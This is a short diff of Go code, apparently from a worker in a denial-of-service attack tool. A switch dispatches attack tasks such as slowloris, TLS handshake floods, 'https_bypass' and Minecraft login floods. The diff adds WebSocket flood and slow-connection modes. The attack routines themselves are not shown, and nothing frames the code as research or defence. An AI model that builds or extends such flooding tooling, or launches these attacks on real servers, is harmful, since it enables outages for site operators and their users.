@@ -1284,6 +1284,10 @@ func (w *Worker) startTask(task *pb.AttackTask) {
 		session = attack.StartTLSHandshakeEx(cfg)
 	case "slowloris", "slow_post":
 		session = attack.StartSlowlorisEx(cfg)
+	case "ws_flood":
+		session = attack.StartWSFloodEx(cfg)
+	case "ws_slow":
+		session = attack.StartWSSlowEx(cfg)
 	case "https_bypass":
 		session = attack.StartHTTPSBypassEx(cfg)
 	case "minecraft_handshake", "minecraft_login":
